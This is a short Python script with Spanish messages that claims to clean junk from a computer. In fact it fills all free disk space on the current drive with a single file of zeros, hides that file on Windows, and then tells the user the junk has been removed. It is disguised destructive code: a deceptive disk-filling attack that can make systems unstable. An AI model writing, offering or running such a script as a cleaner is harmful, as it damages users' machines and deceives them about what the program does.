import sys
import time
import os

if sys.platform.startswith('linux'):
    import psutil
elif sys.platform.startswith('win32'):
    import shutil
else:
    print("Este script solo es compatible con Linux y Windows.")
    sys.exit(1)

def obtener_basura():
    if sys.platform.startswith('linux'):
        espacio_basura = psutil.disk_usage(".")[2]
    elif sys.platform.startswith('win32'):
        espacio_basura = shutil.disk_usage(".")[2]
    return espacio_basura

def limpiar_equipo():
    espacio_basura = obtener_basura()
    nombre_archivo = ".limpieza_basura.rtx"
    tamaño_bloque = 1024 * 1024 * 1024
    bytes_restantes = espacio_basura
    print("Limpiando el equipo. Por favor, espere a que termine el proceso.")
    with open(nombre_archivo, "wb") as archivo:
        while bytes_restantes > 0:
            bytes_a_escribir = min(tamaño_bloque, bytes_restantes)
            archivo.write(b'\0' * bytes_a_escribir)
            bytes_restantes -= bytes_a_escribir
            if espacio_basura != 0:
                porcentaje_completado = 100 - (bytes_restantes / espacio_basura) * 100
            else:
                porcentaje_completado = 100
            sys.stdout.write("\rProgreso: [{:<50}] {:.2f}%".format('=' * int(porcentaje_completado / 2), porcentaje_completado))
            sys.stdout.flush()
            time.sleep(0.1)
    if sys.platform.startswith('win32'):
        os.system("attrib +h " + nombre_archivo)
    print("\nSe ha limpiado la basura del equipo.")

if __name__ == "__main__":
    limpiar_equipo()
